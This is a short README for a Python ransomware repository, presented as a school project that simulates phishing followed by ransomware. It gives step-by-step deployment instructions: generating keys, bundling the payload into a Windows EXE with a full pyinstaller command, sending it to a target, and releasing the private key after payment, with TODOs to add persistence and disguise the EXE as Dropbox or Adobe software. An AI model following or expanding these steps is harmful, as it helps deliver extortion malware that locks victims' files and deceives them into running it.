# pyransomware
School project of simulating a targeted phishing attack, resulting in a ransomware attack.


# Setup and run HOWTO#
1. run create-keys.py # create public/private key pair
2. bundle script into EXE file with pyinstaller: pyinstaller --onefile --windowed --add-data "public.pem;." --add-data "fernet.key;." --add-data "bg.png;." --windowed ./run.py
3. send exe to target
4. give private.pem to target when payment has been made
5. FINISHED

# TODO
- make program functionable if closed
- add EXE icon of victim application (dropbox, adobe, etc)
